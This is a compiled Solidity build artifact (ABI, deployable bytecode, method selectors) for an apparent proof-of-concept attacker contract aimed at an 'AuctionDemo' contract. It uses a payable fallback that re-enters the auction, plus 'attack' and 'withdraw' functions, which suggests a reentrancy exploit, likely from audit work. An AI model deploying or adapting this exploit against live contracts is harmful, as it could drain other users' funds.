{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract AuctionDemo",
          "name": "_auctionDemo",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "auctionDemo",
      "outputs": [
        {
          "internalType": "contract AuctionDemo",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "robinHood",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_tokenId",
          "type": "uint256"
        }
      ],
      "name": "setTokenId",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenId",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b506040516105a73803806105a783398101604081905261002f9161005d565b600180546001600160a01b039092166001600160a01b0319928316179055600080549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b61050b8061009c6000396000f3fe60806040526004361061007b5760003560e01c8063492eaa871161004e578063492eaa87146101715780638bb127a0146101a95780639e5faafc146101c9578063c929ccf3146101d15761007b565b806312065fe0146100e0578063150b7a021461010257806317d70f7c146101465780633ccfd60b1461015c575b600154600254604051635d5bc34760e01b81526001600160a01b0390921691635d5bc347916100b09160040190815260200190565b600060405180830381600087803b1580156100ca57600080fd5b505af11580156100de573d6000803e3d6000fd5b005b3480156100ec57600080fd5b50475b6040519081526020015b60405180910390f35b34801561010e57600080fd5b5061012d61011d3660046103a9565b630a85bd0160e11b949350505050565b6040516001600160e01b031990911681526020016100f9565b34801561015257600080fd5b506100ef60025481565b34801561016857600080fd5b506100de6101f1565b34801561017d57600080fd5b50600054610191906001600160a01b031681565b6040516001600160a01b0390911681526020016100f9565b3480156101b557600080fd5b50600154610191906001600160a01b031681565b6100de6102b8565b3480156101dd57600080fd5b506100de6101ec366004610485565b610348565b6000546001600160a01b031633146102245760405162461bcd60e51b815260040161021b9061049e565b60405180910390fd5b600080546040516001600160a01b039091169047908381818185875af1925050503d8060008114610271576040519150601f19603f3d011682016040523d82523d6000602084013e610276565b606091505b50509050806102b55760405162461bcd60e51b815260206004820152600b60248201526a10d85b1b0819985a5b195960aa1b604482015260640161021b565b50565b6000546001600160a01b031633146102e25760405162461bcd60e51b815260040161021b9061049e565b60015460025460405163249a825160e21b815260048101919091526001600160a01b039091169063926a09449034906024016000604051808303818588803b15801561032d57600080fd5b505af1158015610341573d6000803e3d6000fd5b5050505050565b6000546001600160a01b031633146103725760405162461bcd60e51b815260040161021b9061049e565b600255565b80356001600160a01b038116811461038e57600080fd5b919050565b634e487b7160e01b600052604160045260246000fd5b600080600080608085870312156103bf57600080fd5b6103c885610377565b93506103d660208601610377565b925060408501359150606085013567ffffffffffffffff808211156103fa57600080fd5b818701915087601f83011261040e57600080fd5b81358181111561042057610420610393565b604051601f8201601f19908116603f0116810190838211818310171561044857610448610393565b816040528281528a602084870101111561046157600080fd5b82602086016020830137600060208483010152809550505050505092959194509250565b60006020828403121561049757600080fd5b5035919050565b6020808252601e908201527f536f7272792c206f6e6c7920726f62696e2063616c2063616c6c202d5f2d000060408201526060019056fea26469706673582212200560636596c596099b42ac06f04da47d90f85e228ae6d6ce91fa2f6584b45f6964736f6c63430008130033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack()": "9e5faafc",
    "auctionDemo()": "8bb127a0",
    "getBalance()": "12065fe0",
    "onERC721Received(address,address,uint256,bytes)": "150b7a02",
    "robinHood()": "492eaa87",
    "setTokenId(uint256)": "c929ccf3",
    "tokenId()": "17d70f7c",
    "withdraw()": "3ccfd60b"
  },
  "id": 52
}